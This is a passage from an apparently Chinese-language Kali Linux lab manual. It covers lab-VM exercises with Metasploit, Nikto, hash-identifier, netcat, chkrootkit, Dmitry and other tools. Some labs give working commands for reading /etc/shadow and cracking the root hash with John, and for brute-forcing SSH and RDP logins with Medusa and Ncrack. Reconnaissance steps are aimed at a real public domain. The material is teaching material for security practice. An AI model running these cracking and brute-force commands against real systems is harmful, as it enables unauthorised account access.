class="line-numbers-rows"><span></span></span></code></pre><p>修改配置</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">cd /etc/pure-ftpd/confecho no &gt; Bindecho no &gt; PAMAuthenticationecho no &gt; UnixAuthenticationln -s /etc/pure-ftpd/conf/PureDB /etc/pure-ftpd/auth/50 pure<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>创建FTP服务要用到的用户组和用户</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">groupadd ftpgroup<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>向创建的组里面添加新用户</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">useradd -g ftpgroup -d /dev/null -s /bin/false ftpuser<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>为FTP文件新建一个目录</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">mkdir -p /home/pubftp<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>在ftp目录下新建一个测试文件</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">echo "test file" &gt; /home/pubftp/test.txt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>在FTP目录里面添加用户目录</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">mkdir /home/pubftp/sam<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>给FTP服务添加一个新的用户和密码</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">pure-pw useradd sam -u ftpuser -g ftpgroup -d /home/pubftp/sam<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>更新Pure-FTPd的数据库</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">pure-pw mkdb<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>启动FTP服务</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">service pure-ftpd start<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>启动FTP后，测试该服务</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">ftp 127.0.0.1<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><strong>实验总结</strong></p><p>思考这里的pure-ftpd和Linux的FTP以及vsftpd是否一样</p><h1 id="实验12-Metasploit-db-import实验"><a href="#实验12-Metasploit-db-import实验" class="headerlink" title="实验12 Metasploit-db_import实验"></a>实验12 Metasploit-db_import实验</h1><p><strong>实验场景</strong></p><p>小明是网络工程师，某天他收到上级领导命令，需要在kali服务器使用db_import工具，为避免在部署时候出现什么问题，小明首先在自己的虚拟机上搭建一遍环境。</p><p><strong>实验环境</strong></p><p>kali 2016<br>centos 6.9</p><p>**实验工具</p><p>**</p><p>Metasploit<br>Nmap</p><p><strong>实验目的</strong></p><p>把nmap扫描的数据导入metasploit</p><p><strong>实验步骤</strong></p><ol><li>在kali虚拟机上测试与靶机的连通性</li></ol><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">ping 192.168.127.133 -c 4<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ol start="2"><li>在靶机centos上测试与kali的连通性</li></ol><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">ping 192.168.127.134 -c 4<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ol start="3"><li>在kali上使用nmap进行局域网存活扫描并把结果保存为db.xml</li></ol><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">nmap -sP 192.168.127.0/24 -oX db.xml<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ol start="4"><li>查看刚保存的文件</li></ol><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">cat db.xml<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ol start="5"><li>在kali中启动metasploit并查看数据库中是否有数据，如果有数据使用<code>hosts -d</code>进行清空</li></ol><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">msfconsolehostshosts -d<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><ol start="6"><li>利用db_import把刚刚nmap扫描的数据导入到数据库中(注意文件路径)</li></ol><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">db_import /root/db.xml<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ol start="7"><li>使用<code>hosts</code>查看数据</li></ol><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">hosts<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ol start="8"><li>过滤出其中开启22端口的主机</li></ol><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">services -p 22 -c name,proto<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ol start="9"><li>过滤出开启21端口的主机</li></ol><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">services -p 21 -c name,proto<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><strong>实验总结</strong></p><p>掌握msf下db_import导入数据功能的使用</p><h1 id="实验13-web扫描-Nikto"><a href="#实验13-web扫描-Nikto" class="headerlink" title="实验13 web扫描-Nikto"></a>实验13 web扫描-Nikto</h1><p><strong>实验场景</strong></p><p>小明是网络工程师，某天他收到上级领导命令，需要在kali服务器使用Nikto工具，为避免在部署时候出现什么问题，小明首先在自己的虚拟机上搭建一遍环境。</p><p><strong>实验环境</strong></p><p>kali 2016</p><p><strong>实验工具</strong></p><p>Nikto</p><p><strong>实验目的</strong></p><p>掌握Nikto的使用</p><p><strong>实验步骤</strong></p><p>Nikto 是一款Perl语言开发的开源代码的、功能强大的WEB扫描评估软件，能对web服务器多种安全项目进行测试的扫描软件。</p><p>扫描内容有以下几个方面：</p><ol><li>软件版本</li><li>搜索存在安全隐患的文件（如：某些web维护人员备份完后，遗留的压缩包，若被下载下来，则获得网站源码）</li><li>服务器配置漏洞（组件可能存在默认配置）</li><li>WEB Application层面的安全隐患（XSS，SQL注入等）</li><li>避免 404 误判</li></ol><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">nikto -list-plugins<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>制定网站目录扫描</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">nikto –host http://192.168.21.128/index/<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>指定一个或多个端口进行扫描</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">nikto –host 192.168.21.128 –port 80,443<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>还可以进行批量扫描</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">nikto –host host.txt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>把扫描结果导成文件保存在本地</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">nikto –host 192.168.21.128 –port 80 –output nikto.html<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>用<code>cat</code>查看该文件也可以使用火狐打开该文件</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">cat nikto.htmlfirefox nikto.html<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><strong>实验总结</strong></p><p>观察Nikto的端口扫描和nmap的扫描结果是不是一样，如果不一样，谁的结果更准确一点</p><h1 id="实验-14-哈希工具Hash-Identifier"><a href="#实验-14-哈希工具Hash-Identifier" class="headerlink" title="实验 14 哈希工具Hash-Identifier"></a>实验 14 哈希工具Hash-Identifier</h1><p><strong>实验场景</strong></p><p>小明是网络工程师，某天他收到上级领导命令，需要在kali服务器使用Hash-Identifier<br>工具，为避免在部署时候出现什么问题，小明首先在自己的虚拟机上搭建一遍环境。</p><p><strong>实验环境</strong></p><p>kali 2018</p><p><strong>实验工具</strong></p><p>hash-identifier</p><p><strong>实验目的</strong></p><p>了解工具的使用</p><h2 id="实验步骤-3"><a href="#实验步骤-3" class="headerlink" title="实验步骤"></a>实验步骤</h2><p><strong>1. 哈希值识别</strong></p><p>哈希值是使用HASH算法通过逻辑运算得到的数值。不同的内容使用HASH算法运算后，得到的哈希值不同。当我们拿到一段hash值时该如何去判断它是属于那种算法。</p><p>在终端中启动hash-identifier，提示输入hash值。</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">hash-identifier<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><strong>2. 识别测试数据</strong></p><p>打开root目录下的HASH.txt文件，里面有几组测试数据，后面是hash编码。</p><ul><li>复制第一组数据到hash-identifier，判断该hash值最大可能的算法是MD5，最小可能性的是下面其它算法。</li></ul><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">hash-identifier [first_hash_value]<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ul><li>复制第二组数据到hash-identifier，识别结果是MD5(phpBB3)。</li></ul><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">hash-identifier [second_hash_value]<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ul><li>复制第三组数据到hash-identifier，识别结果是MD5(Unix)。</li></ul><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">hash-identifier [third_hash_value]<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ul><li>复制第四组数据到hash-identifier，识别结果是MD5（Wordpress）。</li></ul><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">hash-identifier [fourth_hash_value]<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ul><li>复制第五组数据到hash-identifier，识别结果是SHA-512。</li></ul><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">hash-identifier [fifth_hash_value]<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ul><li>复制第六组数据到hash-identifier，识别结果最可能的算法是Tiger-192。</li></ul><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">hash-identifier [sixth_hash_value]<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="实验总结"><a href="#实验总结" class="headerlink" title="实验总结"></a>实验总结</h2><p>验证Hash-Identifier工具对MD5等常见编码是否能成功识别。</p><h1 id="实验-15-离线攻击工具-John工具"><a href="#实验-15-离线攻击工具-John工具" class="headerlink" title="实验 15 离线攻击工具-John工具"></a>实验 15 离线攻击工具-John工具</h1><p><strong>实验场景</strong></p><p>小明是网络工程师，某天他收到上级领导命令，需要在kali服务器使用John工具，为<br>避免在部署时候出现什么问题，小明首先在自己的虚拟机上搭建一遍环境。</p><p><strong>实验环境</strong></p><p>kali</p><p><strong>实验工具</strong></p><p>john</p><p><strong>实验目的</strong></p><p>掌握kali下john工具的使用</p><h2 id="实验步骤-4"><a href="#实验步骤-4" class="headerlink" title="实验步骤"></a>实验步骤</h2><p><strong>1. 启动John工具</strong></p><p>先启动john软件，在终端输入以下命令。</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">john<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><strong>2. 获取本机密码散列</strong></p><p>利用john破解密码，首先需要散列，这里我们把本机的密码散列作为密码。</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">unshadow /etc/passwd /etc/shadow &gt; pasd<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><strong>3. 使用John破解密码</strong></p><p>直接使用本地的散列去进行破解，破解出本机的root密码。</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">john pasd<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="实验总结-1"><a href="#实验总结-1" class="headerlink" title="实验总结"></a>实验总结</h2><p>思考John工具成功爆破的前提是在哪？</p><h1 id="实验-16-密码爆破-Medusa"><a href="#实验-16-密码爆破-Medusa" class="headerlink" title="实验 16 密码爆破-Medusa"></a>实验 16 密码爆破-Medusa</h1><p><strong>实验场景</strong></p><p>小明是网络工程师，某天他收到上级领导命令，需要在kali服务器使用Medusa工具，<br>来检测内网中是否存在弱口令服务，为避免在部署时候出现什么问题，小明首先在自己的虚<br>拟机上搭建一遍环境。</p><p><strong>实验环境</strong></p><p>攻击机 kali 2018<br>靶机 centos6.9</p><p><strong>实验工具</strong></p><p>medusa</p><p><strong>实验目的</strong></p><p>了解并掌握密码爆破软件medusa的基本用法</p><h2 id="实验步骤-5"><a href="#实验步骤-5" class="headerlink" title="实验步骤"></a>实验步骤</h2><p><strong>1. 启动Medusa</strong></p><p>Medusa是支持AFP, CVS, FTP, HTTP, IMAP, MS-SQL, MySQL, NCP (NetWare), NNTP, PcAnywhere, POP3, PostgreSQL, rexec, rlogin, rsh, SMB, SMTP (AUTH/VRFY), SNMP, SSHv2, SVN, Telnet, VmAuthd, VNC的密码爆破工具。</p><p>在终端输入以下命令。</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">medusa<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><strong>2. 查看可用模块</strong></p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">medusa -d<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><strong>3. 查看模块帮助</strong></p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">medusa -M telnet -q<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><strong>4. 爆破靶机的ssh</strong></p><p>需要在本机先新增一个<code>username.txt</code>和<code>password.txt</code>。</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">medusa -h 192.168.163.150 -u username.txt -P password.txt -M ssh<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="实验总结-2"><a href="#实验总结-2" class="headerlink" title="实验总结"></a>实验总结</h2><p>使用medusa工具批量爆破内网ip段，检测是否存在弱口令服务。</p><h1 id="实验-17-远程爆破工具-Ncrack"><a href="#实验-17-远程爆破工具-Ncrack" class="headerlink" title="实验 17 远程爆破工具-Ncrack"></a>实验 17 远程爆破工具-Ncrack</h1><p><strong>实验场景</strong></p><p>小明是网络工程师，某天他收到上级领导命令，需要在kali服务器使用Ncrack工具，<br>为避免在部署时候出现什么问题，小明首先在自己的虚拟机上搭建一遍环境。</p><p><strong>实验环境</strong></p><p>攻击机 kali 2018 192.168.163.154<br>靶机 windows 7 192.168.163.134</p><p><strong>实验工具</strong></p><p>Ncrack</p><p><strong>实验目的</strong></p><p>了解并掌握Ncrack工具的使用方法</p><h2 id="实验步骤-6"><a href="#实验步骤-6" class="headerlink" title="实验步骤"></a>实验步骤</h2><p><strong>1. 查看软件版本号</strong></p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">ncrack –v```**2. 查看Ncrack帮助**```bashncrack --help<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>3. 爆破windows主机的3389</strong></p><p>需要先添加一个<code>usename.txt</code>和<code>password.txt</code>文件。</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">ncrack -vv -U usename.txt -P password.txt 192.168.163.134:3389 CL=1 -f<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>根据爆破结果，使用<code>test/111111</code>使用rdesktop可以正常连接。</p><h2 id="实验总结-3"><a href="#实验总结-3" class="headerlink" title="实验总结"></a>实验总结</h2><p>思考同样的爆破工具Ncrack和Medusa的差异和速度上有什么区别。</p><h1 id="实验-18-主机系统识别-p0f"><a href="#实验-18-主机系统识别-p0f" class="headerlink" title="实验 18 主机系统识别-p0f"></a>实验 18 主机系统识别-p0f</h1><p><strong>实验场景</strong></p><p>小明是网络工程师，某天他收到上级领导命令，需要在kali服务器使用主机系统识别<br>p0f工具，为避免在部署时候出现什么问题，小明首先在自己的虚拟机上搭建一遍环境。</p><p><strong>实验环境</strong></p><p>kali</p><p><strong>实验工具</strong></p><p>p0f<br>xprobe2</p><p><strong>实验目的</strong></p><p>掌握使用工具来进行主机系统识别</p><h2 id="实验步骤-7"><a href="#实验步骤-7" class="headerlink" title="实验步骤"></a>实验步骤</h2><p><strong>1. 启动p0f监听</strong></p><p>p0f是一款被动探测工具，通过分析网络数据包来判断操作系统类型。同时p0f在网络分析方面功能强大，可以用它来分析NAT、负载均衡、应用代理等。以下命令为监听网卡<code>eth0</code>并开启混杂模式。</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">p0f -i eth0 -p<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><strong>2. 浏览器访问网页</strong></p><p>通过浏览器去访问网页，能通过p0f观察到对方的系统。</p><h2 id="实验总结-4"><a href="#实验总结-4" class="headerlink" title="实验总结"></a>实验总结</h2><p>思考kali上最经典的扫描工具Nmap跟实验中p0f工具在识别结果上谁更准确。</p><h1 id="实验-19-主机系统识别-xprobe2"><a href="#实验-19-主机系统识别-xprobe2" class="headerlink" title="实验 19 主机系统识别-xprobe2"></a>实验 19 主机系统识别-xprobe2</h1><p><strong>实验场景</strong></p><p>小明是网络工程师，某天他收到上级领导命令，需要在kali服务器使用xprobe 2 工具，<br>为避免在部署时候出现什么问题，小明首先在自己的虚拟机上搭建一遍环境。</p><p><strong>实验环境</strong></p><p>kali2016</p><p><strong>实验工具</strong></p><p>xprobe2</p><p><strong>实验目的</strong></p><p>使用xprobe2进行远程系统识别</p><h2 id="实验步骤-8"><a href="#实验步骤-8" class="headerlink" title="实验步骤"></a>实验步骤</h2><p>xprobe2是一款使用ICMP消息进行操作系统探测的软件，探测结果可以和Nmap互为参照。但是该软件目前公开版本为2005年的版本，对老的操作系统探测结果较为准确。对远程主机探测，可以直接通过xprobe2并制定远程主机ip或者主机名。</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">xprobe2 [remote_host_ip_or_name]<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="实验总结-5"><a href="#实验总结-5" class="headerlink" title="实验总结"></a>实验总结</h2><p>思考xprobe 2 识别主机方式跟nmap和p0f有什么不一样，可以通过抓包去分析。</p><h1 id="实验-20-数据取证-Hashdeep"><a href="#实验-20-数据取证-Hashdeep" class="headerlink" title="实验 20 数据取证-Hashdeep"></a>实验 20 数据取证-Hashdeep</h1><p><strong>实验场景</strong></p><p>小明是网络工程师，某天他收到上级领导命令，需要在kali服务器使用Hashdeep工具，为避免在部署时候出现什么问题，小明首先在自己的虚拟机上搭建一遍环境。</p><p><strong>实验环境</strong></p><p>kali 2018</p><p><strong>实验工具</strong></p><p>hashdeep</p><p><strong>实验目的</strong></p><p>了解数据取证工具hashdeep工具的使用</p><h2 id="实验步骤-9"><a href="#实验步骤-9" class="headerlink" title="实验步骤"></a>实验步骤</h2><ol><li><p>在数据取证中，通常需要验证文件的哈希值，以判断文件是否已知好文件，或者文件是否被修改过。Kali Linux提供专用工具hashdeep。该工具的早期版本名称为md5deep。该工具可以批量计算文件的哈希值，并和哈希值列表进行比对。该工具支持多种哈希算法，可以避免哈希碰撞问题。为了满足不同任务的需要，hashdeep提供多种检查模式，如审计模式、正向模式、反向模式。同时，该工具支持大小写不敏感和UTF编码， 以满足Windows文件系统分析需要。</p></li><li><p>直接启动软件：</p> <pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">hashdeep –h<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p>直接生成本地文件hash值：</p> <pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"># 打印相对文件名而不是绝对文件名hashdeep –l ../*# 打印hash值到本地文件hashdeep –r test.txt &gt; hash.txt<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>根据已知的hash值文件进行hash校验，如果一样即通过，如果不一样即审核不通过：</p> <pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">hashdeep -r -a hash.txt test.txt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li></ol><p><strong>实验总结</strong></p><p>了解了hashdeep工具，以后在下载文件时，可以通过hashdeep比对文件的hash是否一致来保障文件的安全性。</p><h1 id="实验-21-NC端口通信实验"><a href="#实验-21-NC端口通信实验" class="headerlink" title="实验 21 NC端口通信实验"></a>实验 21 NC端口通信实验</h1><p><strong>实验场景</strong></p><p>小明是网络工程师，某天他收到上级领导命令，需要在kali服务器使用NC工具和centos进行通信，为避免在部署时候出现什么问题，小明首先在自己的虚拟机上搭建一遍环境。</p><p><strong>实验环境</strong></p><p>kali 2016<br>centos 6.9</p><p><strong>实验工具</strong></p><p>NC</p><p><strong>实验目的</strong></p><p>Nc是netcat的简写，有着网络界的瑞士军刀，因为它短小精悍、功能实用，是一款简单可靠的网络工具，学习它的基本使用</p><h2 id="实验步骤-10"><a href="#实验步骤-10" class="headerlink" title="实验步骤"></a>实验步骤</h2><ol><li><p>在kali虚拟机上测试与靶机的连通性：</p> <pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">ping 192.168.127.129 -c 4<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p>在靶机centos上使用nc开启服务端口：</p> <pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">nc -l 9999<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p>在kali上使用nmap对靶机进行端口扫描，发现9999端口是开放状态：</p> <pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">nmap -p1-65535 192.168.127.129<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p>在靶机上使用telnet进行测试9999端口是否能访问：</p> <pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">telnet 192.168.127.129<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p>在kali上使用nc语句和靶机通信：</p> <pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">nc 192.168.127.129 9999<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p>在kali上输入语句的同时在靶机上也会进行实时显示：</p> <pre class="line-numbers language-none"><code class="language-none">My name is test<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p>在centos上进行查看发现两者一样的显示。</p></li><li><p>在靶机使用nc开启udp端口：</p> <pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">nc -ul 9999<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p>开启tcp时可以用telnet进行测试端口是否开启，但开启udp端口时，telnet却不能进行检测，此刻就需要使用到nc的udp端口检测语句：</p> <pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">nc -vuz 192.168.163.127.129 9999<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li></ol><p><strong>实验总结</strong></p><p>掌握kali和centos使用NC进行通信的实验。</p><h1 id="实验-22-系统检查-Chkrootkit"><a href="#实验-22-系统检查-Chkrootkit" class="headerlink" title="实验 22 系统检查-Chkrootkit"></a>实验 22 系统检查-Chkrootkit</h1><p><strong>实验场景</strong></p><p>小明是网络工程师，某天他收到上级领导命令，需要在kali服务器使用Chkrootkit工具，为避免在部署时候出现什么问题，小明首先在自己的虚拟机上搭建一遍环境。</p><p><strong>实验环境</strong></p><p>kali 2018</p><p><strong>实验工具</strong></p><p>chkrootkit</p><p><strong>实验目的</strong></p><p>掌握chkrootkit工具的使用</p><h2 id="实验步骤-11"><a href="#实验步骤-11" class="headerlink" title="实验步骤"></a>实验步骤</h2><ol><li><p>chkrootkit是用来监测rootkit是否被安装到当前系统中的工具：</p> <pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">chkrootkit<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p> 如果发现有异常，会报出“INFECTED”字样。</p></li><li><p>查看其它命令：</p> <pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">chkrootkit –h<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p>跳过NFS挂载目录进行检测：</p> <pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">chkrootkit -n<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p>查看chkrootkit版本号：</p> <pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">chkrootkit –V<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li></ol><p><strong>实验总结</strong></p><p>尝试升级chkrootkit来检测本机是否存在疑问的文件。</p><h1 id="实验-23-信息收集-Dmitry"><a href="#实验-23-信息收集-Dmitry" class="headerlink" title="实验 23 信息收集-Dmitry"></a>实验 23 信息收集-Dmitry</h1><p><strong>实验场景</strong></p><p>小明是网络工程师，某天他收到上级领导命令，需要在kali服务器使用Dmitry工具，为避免在部署时候出现什么问题，小明首先在自己的</p><p>虚拟机上搭建一遍环境。</p><p><strong>实验环境</strong></p><p>kali 2018 攻击机<br>windows 7 靶机 192.168.163.147</p><p><strong>实验工具</strong></p><p>dmitry</p><p><strong>实验目的</strong></p><p>掌握信息收集工具dmitry的使用</p><h2 id="实验步骤-12"><a href="#实验步骤-12" class="headerlink" title="实验步骤"></a>实验步骤</h2><ol><li><p>直接在终端中启动工具：</p> <pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">dmitry -h<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p>对主机进行端口扫描：</p> <pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">dmitry –p 192.168.163.147<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p> 将输出保存到%host.txt或由-o文件指定的文件：</p> <pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">dmitry –p 192.168.163.147 –o test<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p>扫描端口同时读取从扫描端口接收的banner：</p> <pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">dmitry – p 192.168.163.147 –b<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p>对主机的域名执行whois查找（需要联网操作）：</p> <pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">dmitry – w baidu.com<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p>在主机上检索Netcraft.com信息（需要联网操作）：</p> <pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">dmitry – n baidu.com<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p>执行搜索可能的子域（需要联网操作）：</p> <pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">dmitry – s baidu.com<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p>执行搜索可能的电子邮件地址（需要联网操作）：</p> <pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">dmitry – e baidu.com<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li></ol><p><strong>实验总结</strong></p><p>思考在Dmitry工具中如果探测内网主机是否需要联网。</p><h1 id="实验-24-信息收集-Netdiscover"><a href="#实验-24-信息收集-Netdiscover" class="headerlink" title="实验 24 信息收集-Netdiscover"></a>实验 24 信息收集-Netdiscover</h1><p><strong>实验场景</strong></p><p>小明是网络工程师，某天他收到上级领导命令，需要在kali服务器使用Netdiscover工具，为避免在部署时候出现什么问题，小明首先在自己的虚拟机上搭建一遍环境。</p><p><strong>实验环境</strong></p><p>kali 2016</p><p><strong>实验工具</strong></p><p>netdiscover</p><p><strong>实验目的</strong></p><p>了解netdiscover工具的使用</p><h2 id="实验步骤-13"><a href="#实验步骤-13" class="headerlink" title="实验步骤"></a>实验步骤</h2><ol><li><p>查看帮助：</p> <pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">netdiscover –h<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p>扫描本地网卡设备：</p> <pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">netdiscover –i eth0<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p>发送每个arp请求的次数，测试具有丢包的网络：</p> <pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">netdiscover –c 192.168.21.1<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p>扫描给定范围的主机：</p> <pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">netdiscover –r 192.168.21.0/24<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p>使用被动模式，只进行嗅探：</p> <pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">netdiscover –p<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li></ol><p><strong>实验总结</strong></p><p>掌握Netdiscover的嗅探模式，在特定地方有奇效。</p><h1 id="实验25-NC传输文件实验"><a href="#实验25-NC传输文件实验" class="headerlink" title="实验25 NC传输文件实验"></a>实验25 NC传输文件实验</h1><p><strong>实验场景</strong></p><p>小明是网络工程师，某天他收到上级领导命令，需要在kali服务器使用NC工具和centos进行文件传输实验，为避免在部署时候出现什么问题，小明首先在自己的虚拟机上搭建一遍环境。</p><p><strong>实验环境</strong></p><p>kali 2016<br>centos 6.9</p><p><strong>实验工具</strong></p><p>NC</p><p><strong>实验目的</strong></p><p>Nc是netcat的简写，有着网络界的瑞士军刀，因为它短小精悍、功能实用，是一款简单可靠的网络工具，使用nc进行文件传输</p><h2 id="实验步骤-14"><a href="#实验步骤-14" class="headerlink" title="实验步骤"></a>实验步骤</h2><ol><li><p>在kali虚拟机上测试与靶机的连通性：</p> <pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">ping 192.168.127.129 -c 4<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p>在kali里面新建一个ceshi.txt文件并查看：</p> <pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">echo "this is test" &gt; ceshi.txt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p>在靶机centos上使用nc监听端口9999，接受到的所有数据都写到test文件里：</p> <pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">nc -l 9999 &gt; test.txt<span aria-hidden="true" 